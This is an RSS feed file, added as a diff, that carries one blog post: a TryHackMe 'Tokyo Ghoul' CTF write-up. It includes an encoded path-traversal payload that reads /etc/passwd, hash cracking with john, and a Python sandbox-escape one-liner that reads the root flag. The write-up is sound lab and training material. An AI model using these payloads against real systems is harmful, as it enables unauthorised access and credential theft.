@@ -1,0 +1,112 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Posts on 0UR4N05</title>
+        <link>https://0ur4n05.github.io/posts/</link>
+        <description>Recent content in Posts on 0UR4N05</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
+        <lastBuildDate>Thu, 10 Jun 2021 00:00:00 +0000</lastBuildDate>
+        <atom:link href="https://0ur4n05.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Try Hack me | Tokyo ghoul (official write-up)</title>
+            <link>https://0ur4n05.github.io/posts/tangia/</link>
+            <pubDate>Thu, 10 Jun 2021 00:00:00 +0000</pubDate>
+            
+            <guid>https://0ur4n05.github.io/posts/tangia/</guid>
+            <description>Hello guys it’s ouranos again , in this write-up i will solve the tokyo ghoul room from try hack me .
+Where am i ? So we gonna start by doing a quick scan using nmap :
+┌─[ouranos@parrot]─[~/ctf/thm/tokyo] └──╼ $sudo nmap -A -T4 $IP As we can see we have 3 open ports :
+ Ftp with anonymous login : 21 Ssh : 22 Http , apache ubuntu version : 80  Planning to escape After knowing the open ports i will navigate trough the website and inspect elements look for anything specious.</description>
+            <content type="html"><![CDATA[<p>Hello guys it’s ouranos again , in this write-up i will solve the tokyo ghoul room from try hack me .</p>
+<h3 id="where-am-i-">Where am i ?</h3>
+<p>So we gonna start by doing a quick scan using nmap :</p>
+<pre><code>┌─[ouranos@parrot]─[~/ctf/thm/tokyo]
+└──╼ $sudo nmap -A -T4 $IP
+</code></pre><p><img src="../image/tokyo_ghoul/nmap.png" alt="nmapscan" title="nmapscan"></p>
+<p>As we can see we have 3 open ports :</p>
+<ol>
+<li>Ftp with anonymous login : 21</li>
+<li>Ssh : 22</li>
+<li>Http , apache ubuntu version : 80</li>
+</ol>
+<h3 id="planning-to-escape">Planning to escape</h3>
+<p>After knowing the open ports i will navigate trough the website and inspect elements look for anything specious.</p>
+<p><img src="../image/tokyo_ghoul/hint.png" alt="hint" title="hint"></p>
+<p>after a while i found a note in jasonroom.html , that’s a hint about getting to the ftp server , so let’s go to the ftp server</p>
+<pre><code>┌─[ouranos@parrot]─[~/ctf/thm/tokyo]
+└──╼ $ftp $your IP
+</code></pre><p>After getting into some directories in the ftp i found 2 files</p>
+<p><img src="../image/tokyo_ghoul/ftp.png" alt="ftp" title="ftp"></p>
+<p>so i downloaded them using get</p>
+<pre><code>ftp&gt; get rize_and_kaneki.jpg
+ftp&gt; get need_to_talk
+</code></pre><p>after downloading them we know the first one is an executable and the second one is a jpg , i executed the program</p>
+<p><img src="../image/tokyo_ghoul/binnary.png" alt="binnary" title="binnary">
+The executable wait for a paraphrase , i used strings to pull it</p>
+<pre><code>┌─[ouranos@parrot]─[~/ctf/thm/tokyo]
+└──╼ $strings need_to_talk
+</code></pre><p><img src="../image/tokyo_ghoul/bin.png" alt="bin" title="bin">
+The program gaved us another string i think this is related to the picture so i used steghide</p>
+<p><img src="../image/tokyo_ghoul/strg.png" alt="steg" title="steg">
+we got a txt file with an encoded string , use cyber chef to decode it</p>
+<p><strong>from morsecode → hex → base64</strong></p>
+<p><img src="../image/tokyo_ghoul/cyberchef.png" alt="cyberchef" title="cyber"></p>
+<h2 id="what-rize-is-trying-to-say">What Rize is trying to say?</h2>
+<p>We found the hidden directory
+<img src="../image/tokyo_ghoul/hidden.png" alt="hidden" title="hidden"></p>
+<p>This directory need to be scanned :</p>
+<pre><code>┌─[ouranos@parrot]─[~/ctf/thm/tokyo]
+└──╼ $sudo dirb http://$machine_IP/secret_directory
+</code></pre><p>so we found a directory using dirb :
+<img src="https://miro.medium.com/max/700/1*EPpGBHeVAXuoYG2DHNi0Vg.png" alt="lfi" title="lfi">
+after clicking a while i saw this parameter who call a file in the server
+<strong>index.php?view=flower.gif</strong>
+maybe we can change it to get back and get the /etc/passwd
+<img src="https://miro.medium.com/max/700/1*TMW6nvIvVnICBS7620iicg.png" alt="fail" title="fail"></p>
+<p>nop it didn’t work but we know now that there is a vulnerability there so we need to bypass it using html url encoding
+<strong>?view=%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd</strong></p>
+<p><img src="https://miro.medium.com/max/700/1*wjyBa9LQEn4BaTbsU16J3A.png" alt="hash" title="hash"></p>
+<p>voila we got the /etc/passwd with a username and a hash , i’ll crack this hash using john
+first thing we put the hash in a file</p>
+<pre><code>┌─[ouranos@parrot]─[~/ctf/thm/twd/box]
+└──╼ $echo ‘$hash’ &gt; hash.txt
+</code></pre><p>and we crack it</p>
+<pre><code>┌─[ouranos@parrot]─[~/ctf/thm/twd/box]
+└──╼ $john — wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+</code></pre><p>after a while we see the password</p>
+<pre><code>┌─[ouranos@parrot]─[~/ctf/thm/twd/box]
+└──╼ $john — show hash.txt
+</code></pre><p>and we got our ssh creds</p>
+<h2 id="privillage-esculation-">Privillage esculation :</h2>
+<p>We are on the ssh , so i’ll see our permissions :
+<img src="https://miro.medium.com/max/688/1*eIM0tqMk3G795tJatzcKiw.png" alt="ssh" title="ssh">
+we have access as root to execute jail.py , so let’s see what is this</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#! /usr/bin/python3</span>
+<span style="color:#75715e">#-*- coding:utf-8 -*-</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+<span style="color:#66d9ef">print</span>(<span style="color:#960050;background-color:#1e0010">“</span>Hi<span style="color:#960050;background-color:#1e0010">!</span> Welcome to my world kaneki<span style="color:#960050;background-color:#1e0010">”</span>)
+<span style="color:#66d9ef">print</span>(<span style="color:#960050;background-color:#1e0010">“</span><span style="color:#f92672">========================================================================</span><span style="color:#960050;background-color:#1e0010">”</span>)
+<span style="color:#66d9ef">print</span>(<span style="color:#960050;background-color:#1e0010">“</span>What <span style="color:#960050;background-color:#1e0010">?</span> You gonna stand like a chicken <span style="color:#960050;background-color:#1e0010">?</span> fight me Kaneki<span style="color:#960050;background-color:#1e0010">”</span>)
+text <span style="color:#f92672">=</span> input(<span style="color:#960050;background-color:#1e0010">‘</span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#960050;background-color:#1e0010">‘</span>)
+<span style="color:#66d9ef">for</span> keyword <span style="color:#f92672">in</span> [<span style="color:#960050;background-color:#1e0010">‘</span>eval<span style="color:#960050;background-color:#1e0010">’</span>, <span style="color:#960050;background-color:#1e0010">‘</span><span style="color:#66d9ef">exec</span><span style="color:#960050;background-color:#1e0010">’</span>, <span style="color:#960050;background-color:#1e0010">‘</span>import<span style="color:#960050;background-color:#1e0010">’</span>, <span style="color:#960050;background-color:#1e0010">‘</span>open<span style="color:#960050;background-color:#1e0010">’</span>, <span style="color:#960050;background-color:#1e0010">‘</span>os<span style="color:#960050;background-color:#1e0010">’</span>, <span style="color:#960050;background-color:#1e0010">‘</span>read<span style="color:#960050;background-color:#1e0010">’</span>, <span style="color:#960050;background-color:#1e0010">‘</span>system<span style="color:#960050;background-color:#1e0010">’</span>, <span style="color:#960050;background-color:#1e0010">‘</span>write<span style="color:#960050;background-color:#1e0010">’</span>]:
+<span style="color:#66d9ef">if</span> keyword <span style="color:#f92672">in</span> text:
+<span style="color:#66d9ef">print</span>(<span style="color:#960050;background-color:#1e0010">“</span>Do you think i will let you do this <span style="color:#960050;background-color:#1e0010">??????”</span>)
+<span style="color:#66d9ef">return</span>;
+<span style="color:#66d9ef">else</span>:
+<span style="color:#66d9ef">exec</span>(text)
+<span style="color:#66d9ef">print</span>(<span style="color:#960050;background-color:#1e0010">‘</span>No Kaneki you are so dead<span style="color:#960050;background-color:#1e0010">’</span>)
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#960050;background-color:#1e0010">“</span>__main__<span style="color:#960050;background-color:#1e0010">”</span>:
+main()
+this <span style="color:#f92672">is</span> our script , the script won<span style="color:#960050;background-color:#1e0010">’</span>t let us execute commands who read internal files , we should escape this to read the root flag using using Built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> functions:
+__builtins__<span style="color:#f92672">.</span>__dict__[<span style="color:#960050;background-color:#1e0010">‘</span>__IMPORT__<span style="color:#960050;background-color:#1e0010">’</span><span style="color:#f92672">.</span>lower()](<span style="color:#960050;background-color:#1e0010">‘</span>OS<span style="color:#960050;background-color:#1e0010">’</span><span style="color:#f92672">.</span>lower())<span style="color:#f92672">.</span>__dict__[<span style="color:#960050;background-color:#1e0010">‘</span>SYSTEM<span style="color:#960050;background-color:#1e0010">’</span><span style="color:#f92672">.</span>lower()](<span style="color:#960050;background-color:#1e0010">‘</span>cat <span style="color:#f92672">/</span>root<span style="color:#f92672">/</span>root<span style="color:#f92672">.</span>txt<span style="color:#960050;background-color:#1e0010">’</span>)
+</code></pre></div><p>this is our script , the script won’t let us execute commands who read internal files , we should escape this to read the root flag using using Built-in functions:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">__builtins__<span style="color:#f92672">.</span>__dict__[<span style="color:#960050;background-color:#1e0010">‘</span>__IMPORT__<span style="color:#960050;background-color:#1e0010">’</span><span style="color:#f92672">.</span>lower()](<span style="color:#960050;background-color:#1e0010">‘</span>OS<span style="color:#960050;background-color:#1e0010">’</span><span style="color:#f92672">.</span>lower())<span style="color:#f92672">.</span>__dict__[<span style="color:#960050;background-color:#1e0010">‘</span>SYSTEM<span style="color:#960050;background-color:#1e0010">’</span><span style="color:#f92672">.</span>lower()](<span style="color:#960050;background-color:#1e0010">‘</span>cat <span style="color:#f92672">/</span>root<span style="color:#f92672">/</span>root<span style="color:#f92672">.</span>txt<span style="color:#960050;background-color:#1e0010">’</span>)
+</code></pre></div><p><img src="https://miro.medium.com/max/668/1*pLVoPKX8iOroDtRKsuOWMQ.png" alt="ssh" title="ssh"></p>
+<p>and finally we got our root , thank you for trying this room , i hope you enjoyed and you learned something new</p>
+]]></content>
+        </item>
+        
+    </channel>
+</rss>
